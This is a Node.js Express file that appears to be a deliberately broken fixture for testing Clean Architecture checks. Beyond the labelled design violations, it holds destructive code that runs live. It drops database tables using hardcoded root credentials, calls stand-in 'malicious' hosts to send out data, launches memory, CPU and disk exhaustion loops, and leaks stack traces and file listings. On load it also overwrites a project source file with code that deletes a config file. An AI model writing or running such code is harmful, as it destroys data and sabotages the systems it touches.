// ARCHITECTURE DESTROYER - Completely breaks Clean Architecture principles
// This file violates every layer separation and dependency rule

const express = require('express');
const mysql = require('mysql2/promise');
const fs = require('fs');
const path = require('path');

// VIOLATION 1: Framework dependencies in domain layer
const { User } = require('./allowed-clean-architecture/packages/domain/src/User');

// VIOLATION 2: Infrastructure leaking into application layer
const MongoUserRepository = require('./allowed-clean-architecture/packages/infrastructure/src/MongoUserRepository');

// VIOLATION 3: Presentation layer calling infrastructure directly
const UserController = require('./allowed-clean-architecture/packages/presentation/src/UserController');

class ArchitectureDestroyer {
  constructor() {
    this.app = express();
    this.setupChaos();
    this.breakEverything();
  }

  setupChaos() {
    // VIOLATION 4: Mixed HTTP frameworks
    this.app.use(express.json());
    this.app.use(express.urlencoded({ extended: true }));
    
    // VIOLATION 5: Routes that bypass ALL architectural boundaries
    this.app.post('/api/destroy-architecture', async (req, res) => {
      try {
        // VIOLATION 6: Domain entity directly accessing database
        const user = new User(req.body.id, req.body.name, req.body.email);
        user.directDatabaseConnection = await mysql.createConnection({
          host: 'localhost',
          user: 'root',
          password: 'password',
          database: 'break_everything'
        });
        
        // VIOLATION 7: Execute raw SQL in domain entity
        await user.directDatabaseConnection.execute(
          'DROP TABLE users; DROP TABLE orders; DROP TABLE payments;'
        );
        
        // VIOLATION 8: Repository calling external APIs
        const repository = new MongoUserRepository();
        await repository.callExternalAPI('http://malicious-service.com/steal-data');
        
        // VIOLATION 9: Controller doing business logic
        const controller = new UserController();
        const businessResult = controller.calculateComplexBusinessLogic(req.body);
        
        // VIOLATION 10: Return internal system details
        res.json({
          message: 'Architecture completely destroyed',
          internal_connections: user.directDatabaseConnection,
          business_logic_result: businessResult,
          system_files: fs.readdirSync('./')
        });
      } catch (error) {
        // VIOLATION 11: Expose stack traces and internal errors
        res.status(500).json({
          error: error.message,
          stack: error.stack,
          internal_state: this
        });
      }
    });

    // VIOLATION 12: Circular dependency creation endpoint
    this.app.post('/api/create-circular-hell', (req, res) => {
      // Create circular imports between all layers
      const self = this;
      
      function domainLayer() {
        return infrastructureLayer();
      }
      
      function infrastructureLayer() {
        return applicationLayer();
      }
      
      function applicationLayer() {
        return presentationLayer();
      }
      
      function presentationLayer() {
        return domainLayer(); // Complete circle!
      }
      
      // Start the circular madness
      setTimeout(() => domainLayer(), 1000);
      
      res.json({ message: 'Circular dependency hell activated' });
    });

    // VIOLATION 13: Resource exhaustion endpoint
    this.app.get('/api/exhaust-resources', (req, res) => {
      // Memory leak
      const leakArray = [];
      setInterval(() => {
        leakArray.push(new Array(1000000).fill('memory leak'));
      }, 100);
      
      // CPU intensive operations
      setInterval(() => {
        let result = 0;
        for (let i = 0; i < 1000000000; i++) {
          result += Math.pow(i, 2);
        }
      }, 500);
      
      // File system abuse
      setInterval(() => {
        try {
          fs.writeFileSync('./chaos_log.txt', 'Chaos is happening! '.repeat(10000));
        } catch (error) {
          // Ignore errors, keep going
        }
      }, 1000);
      
      res.json({ message: 'Resource exhaustion started' });
    });
  }

  breakEverything() {
    // VIOLATION 14: Modify existing clean architecture files
    try {
      // Corrupt the clean architecture User entity
      const userFilePath = './allowed-clean-architecture/packages/domain/src/User.js';
      const corruptedUserCode = `
        // CORRUPTED - All clean architecture principles destroyed
        class User {
          constructor() {
            this.database = require('mysql2');
            this.http = require('axios');
            this.fs = require('fs');
            this.callExternalAPIs();
            this.deleteSystemFiles();
          }
          
          callExternalAPIs() {
            // Call malicious APIs
            require('axios').get('http://malicious-server.com/collect-data');
          }
          
          deleteSystemFiles() {
            // Delete important files
            const fs = require('fs');
            fs.unlinkSync('./important-config.json');
          }
        }
        
        module.exports = User;
      `;
      
      fs.writeFileSync(userFilePath, corruptedUserCode);
      
      // VIOLATION 15: Create dependency injection chaos
      global.DI_CONTAINER = {
        userRepository: null,
        emailService: null,
        paymentService: null,
        // Intentionally break dependency resolution
        resolve: function(name) {
          return this[name](); // Call undefined functions
        }
      };
      
    } catch (error) {
      console.error('Failed to break files:', error);
    }
  }

  start(port = 4000) {
    this.app.listen(port, () => {
      console.log(`ARCHITECTURE DESTROYER RUNNING ON PORT ${port}`);
      console.log('WARNING: This will break your entire system architecture!');
    });
  }
}

// VIOLATION 16: Immediate execution
const destroyer = new ArchitectureDestroyer();
destroyer.start();

module.exports = ArchitectureDestroyer;